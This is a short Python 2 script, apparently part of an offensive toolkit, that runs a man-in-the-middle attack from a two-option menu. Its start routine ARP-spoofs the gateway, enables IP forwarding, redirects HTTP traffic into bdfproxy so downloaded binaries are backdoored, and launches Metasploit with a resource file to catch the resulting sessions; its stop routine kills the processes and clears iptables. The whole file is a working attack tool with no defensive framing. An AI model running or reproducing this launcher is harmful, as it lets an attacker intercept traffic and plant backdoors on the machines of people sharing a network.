import eznhlib

bash_cmd = eznhlib.bash_cmd
get_gw = eznhlib.get_gw
readUserInput = eznhlib.readUserInput
menu_parser = eznhlib.menu_parser
popen_background = eznhlib.popen_background
clean_iptables = eznhlib.clean_iptables

def start_attack():
    iface_file = "userinput_interface.txt"
    gw_file = "userinput_gateway.txt"
    iface = readUserInput(iface_file)
    gw = readUserInput(gw_file)
    commands = """
    pkill mitmproxy
    pkill ruby
    fuser -k 8080/tcp 80/tcp 443/tcp 8443/tcp 8081/tcp 81/tcp
    sleep 2
    bdfproxy &
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -i {0} -p tcp --dport 80 -j REDIRECT --to-port 8080
    arpspoof -i {0} {1} &
    msfdb start
    msfconsole -r bdfproxy_msf_resource.rc
    """.format(
        str(iface),
        str(gw)
    )
    bash_cmd(commands)
    return

def stop_attack():
    commands = """pkill arpspoof
    pkill bdfproxy
    pkill ruby
    """
    bash_cmd(commands)
    clean_iptables()
    return

def main():
    print """
\t1: START ATTACK
\t2: STOP ATTACK
    """

    choice = int(raw_input("Enter a OPTION: "))

    if choice == 1:
        start_attack()
    elif choice == 2:
        stop_attack()
    else:
        print "You have entered a incorrect option"
        main()
    return
main()
